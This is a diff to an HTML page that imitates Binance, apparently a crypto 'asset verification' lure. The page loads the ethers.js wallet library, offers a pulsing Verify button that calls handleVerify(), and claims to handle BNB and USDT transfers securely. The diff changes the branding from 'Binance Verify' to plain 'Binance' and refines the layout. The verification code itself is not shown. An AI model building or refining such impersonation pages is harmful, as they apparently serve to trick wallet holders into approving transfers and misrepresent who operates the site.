@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Binance Verify</title>
+  <title>Binance</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.8.0/ethers.umd.min.js"></script>
   <style>
@@ -19,19 +19,22 @@
       z-index: 10;
     }
     .button-primary:hover { background-color: #fbbf24; }
-    .card:hover { transform: translateY(-5px); box-shadow: 0 10px 20px rgba(250,204,21,0.3); }
     .pulse-ring {
       position: absolute;
       border: 2px solid #FACC15;
       border-radius: 50%;
       animation: pulse-ring 2.5s cubic-bezier(0.4,0,0.6,1) infinite;
-      opacity: 0.6;
+      z-index: 1;
     }
+    .pulse-ring:nth-child(1) { animation-delay: 0s; }
+    .pulse-ring:nth-child(2) { animation-delay: 0.8s; }
+    .pulse-ring:nth-child(3) { animation-delay: 1.6s; }
     @keyframes pulse-ring {
       0% { transform: scale(0.8); opacity: 0.7; }
       70% { transform: scale(1.3); opacity: 0; }
       100% { opacity: 0; }
     }
+    .card:hover { transform: translateY(-5px); box-shadow: 0 10px 20px rgba(250,204,21,0.3); }
   </style>
 </head>
 <body class="flex flex-col min-h-screen">
@@ -40,8 +43,8 @@
   <header class="bg-[#171717] bg-opacity-90 backdrop-blur-md sticky top-0 z-50 shadow-md">
     <nav class="container mx-auto px-6 py-4 flex justify-between items-center">
       <a href="#" class="flex items-center space-x-2">
-        <img src="./binance-yellow-rhombus-lawc3crgelc4t98h.jpg" alt="Binance Logo" class="h-8 w-8"/>
-        <span class="text-xl font-bold text-yellow-400">Binance Verify</span>
+        <img src="binance-yellow-rhombus-lawc3crgelc4t98h.jpg" alt="Binance Logo" class="h-8 w-8"/>
+        <span class="text-xl font-bold text-yellow-400">Binance</span>
       </a>
       <div class="hidden md:flex space-x-8 text-sm font-medium">
         <a href="#" class="hover:text-yellow-400 transition-colors">Home</a>
@@ -59,27 +62,20 @@
   </header>
 
   <!-- Hero Section -->
-  <main class="flex flex-col items-center justify-center text-center px-4 sm:px-6 py-12">
-    <h1 class="text-3xl sm:text-4xl md:text-5xl font-bold text-yellow-400 mb-4 leading-tight">
-      Verify Crypto Assets
-    </h1>
-    <p class="text-gray-300 mb-8 max-w-full sm:max-w-xl">
-      Instant verification of BNB Chain assets. Supports both BNB and USDT (BEP20) transfers securely.
-    </p>
+  <main class="flex flex-col items-center justify-center text-center px-6 py-12">
+    <h1 class="text-4xl md:text-5xl font-bold text-yellow-400 mb-4">Verify Crypto Assets</h1>
+    <p class="text-gray-300 mb-8 max-w-xl">Instant verification of BNB Chain assets. Supports both BNB and USDT (BEP20) transfers securely.</p>
 
     <!-- Pulse + Button Wrapper -->
     <div class="relative flex justify-center items-center w-40 h-40 sm:w-48 sm:h-48 mb-8">
-      <!-- Pulse Rings -->
-      <div class="pulse-ring w-36 h-36 top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2"></div>
-      <div class="pulse-ring w-28 h-28 top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2"></div>
-      <div class="pulse-ring w-20 h-20 top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2"></div>
-
-      <!-- Verify Button -->
-      <button onclick="handleVerify()" class="button-primary z-10 text-sm sm:text-base">
-        Verify
-      </button>
+      <div class="absolute inset-0 flex justify-center items-center">
+        <div class="pulse-ring w-36 h-36"></div>
+        <div class="pulse-ring w-28 h-28"></div>
+        <div class="pulse-ring w-20 h-20"></div>
+      </div>
+      <button onclick="handleVerify()" class="button-primary z-10 text-sm sm:text-base">Verify</button>
     </div>
-    <p id="status" class="text-gray-300 text-sm sm:text-lg">Click Verify to start...</p>
+    <p id="status" class="text-gray-300 text-lg">Click Verify to start...</p>
   </main>
 
   <!-- Cards Section -->
